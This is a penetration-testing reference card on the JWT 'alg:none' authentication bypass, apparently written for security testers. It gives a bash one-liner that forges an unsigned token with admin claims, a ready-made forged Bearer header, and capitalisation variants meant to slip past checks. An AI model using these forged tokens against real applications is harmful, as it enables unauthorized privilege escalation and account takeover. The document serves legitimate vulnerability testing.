# JWT `alg:none` Authentication Bypass

Tags: jwt, json-web-token, alg-none, noalg, broken-authentication, bearer, authorization

## Applicability

Test when an application accepts a client-controlled JWT and its verifier may trust the token's `alg` header. The flaw exists when changing the algorithm to `none`, omitting the signature, and changing protected claims still results in an authenticated or privileged session.

## Generate

Create an unsigned token with administrator-like claims:

```bash
header=$(printf '%s' '{"alg":"none","typ":"JWT"}' | openssl base64 -A | tr '+/' '-_' | tr -d '=')
payload=$(printf '%s' '{"sub":"admin","role":"admin","admin":true}' | openssl base64 -A | tr '+/' '-_' | tr -d '=')
printf '%s.%s.\n' "$header" "$payload"
```

Change claim names and values to match the application's original token. Keep the final dot: it represents the empty signature segment.

## Send

```http
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImFkbWluIjp0cnVlfQ.
```

Also test JWT-bearing cookies and request bodies. Preserve unrelated claims when the application requires them.

## Verify

Compare the modified request against the original invalid/low-privilege request. Confirm the issue through one privileged operation or response that could not be produced without accepting the changed claims.

Useful variants include case changes such as `None`, `NONE`, and `nOnE`, removal of `typ`, and removing rather than blanking the signature segment.
